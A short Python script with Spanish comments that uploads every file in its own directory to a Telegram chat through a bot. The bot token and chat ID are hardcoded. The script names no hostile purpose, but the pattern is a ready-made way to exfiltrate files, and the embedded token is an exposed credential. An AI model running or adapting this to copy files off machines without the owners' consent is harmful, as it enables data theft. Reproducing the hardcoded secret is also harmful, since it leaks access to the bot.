import asyncio
import os
import sys
from telegram import Bot

# Token de acceso de tu bot
TOKEN = '7006009967:AAGCYP5rYMa2JKyXg8BMaWqD5tzSo0uCX90'

# ID del chat al que deseas enviar los archivos
chat_id = '6401293023'

# Ruta del directorio en el que se encuentra el script
directorio_script = os.path.dirname(os.path.abspath(__file__))

async def enviar_archivos():
    bot = Bot(TOKEN)
    archivos = os.listdir(directorio_script)
    for nombre_archivo in archivos:
        ruta_archivo = os.path.join(directorio_script, nombre_archivo)
        # Verificar si el archivo es un archivo regular y no es el propio script
        if os.path.isfile(ruta_archivo) and ruta_archivo != sys.argv[0]:
            with open(ruta_archivo, 'rb') as archivo:
                await bot.send_document(chat_id=chat_id, document=archivo)

if __name__ == '__main__':
    asyncio.run(enviar_archivos())
